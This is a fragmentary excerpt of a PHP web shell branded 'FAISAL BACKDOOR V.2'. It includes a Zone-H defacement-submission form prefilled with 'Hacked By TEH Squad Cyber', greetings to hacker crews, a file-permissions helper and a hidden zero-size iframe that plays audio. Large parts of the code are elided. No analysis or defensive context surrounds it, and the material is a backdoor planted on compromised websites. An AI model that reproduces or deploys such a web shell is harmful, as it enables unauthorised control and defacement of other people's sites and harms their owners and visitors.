...
<body>
<h1><center><img src="https://c.top4top.net/p_11004tbku0.gif" height="350 width="350"><font color="white" face=""><div class="lazy">FAISAL BACKDOOR V.2</font></center></h1>
...
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='TEH Squad Cyber'><br>
		<u>Domains</u>: <br>
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By TEH Squad Cyber</textarea><br>
...
echo '<center><br/>Greetz~ @: Explosion Squad Cyber & F0UR$D34TH#T34M </center>
</body>
</html>';
function perms($file){
...
?>
<iframe width="0" height="0"src="https://api.soundcloud.com/tracks/554706564/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" frameborder="0" allowfullscreen></iframe>
